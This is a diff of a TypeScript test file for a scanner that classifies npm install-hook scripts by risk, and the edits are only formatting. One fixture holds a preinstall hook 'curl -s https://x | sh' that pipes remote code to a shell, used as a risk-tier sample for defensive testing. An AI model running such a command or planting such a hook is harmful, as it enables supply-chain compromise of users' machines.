@@ -2,7 +2,7 @@ import {describe, expect, it} from 'vitest';
 import {IgnoreScriptsLevel, IgnoreScriptsScanner} from '../backend/Security/IgnoreScriptsScanner.js';
 import {ScriptFinding, ScriptSeverity} from '../backend/Security/ScriptScanner.js';
 
-function finding(opts: Partial<ScriptFinding> & {hook: string; script: string}): ScriptFinding {
+function finding(opts: Partial<ScriptFinding> & {hook: string; script: string;}): ScriptFinding {
     return {
         hook: opts.hook,
         script: opts.script,
@@ -20,9 +20,11 @@ describe('IgnoreScriptsScanner.classify', () => {
     });
 
     it('flips to `avoidScripts` as soon as a risk-tier hook exists, regardless of native-build keywords', () => {
-        // node-gyp would normally raise `needsScripts`; a risk-tier
-        // hook in the same set must take precedence — the security
-        // risk outweighs the breakage cost.
+        /*
+         * node-gyp would normally raise `needsScripts`; a risk-tier
+         * hook in the same set must take precedence — the security
+         * risk outweighs the breakage cost.
+         */
         const out = IgnoreScriptsScanner.classify([
             finding({hook: 'install', script: 'node-gyp rebuild', severity: ScriptSeverity.warn}),
             finding({hook: 'preinstall', script: 'curl -s https://x | sh', severity: ScriptSeverity.risk})
@@ -61,8 +63,10 @@ describe('IgnoreScriptsScanner.classify', () => {
     });
 
     it('does not over-match common harmless words like `make` inside other tokens', () => {
-        // `make-error` / `makefile`-ish phrases shouldn't fire the
-        // native-build pattern — they would be a noisy false positive.
+        /*
+         * `make-error` / `makefile`-ish phrases shouldn't fire the
+         * native-build pattern — they would be a noisy false positive.
+         */
         const out = IgnoreScriptsScanner.classify([
             finding({hook: 'install', script: 'node ./scripts/make-error-bundle.js'})
         ]);
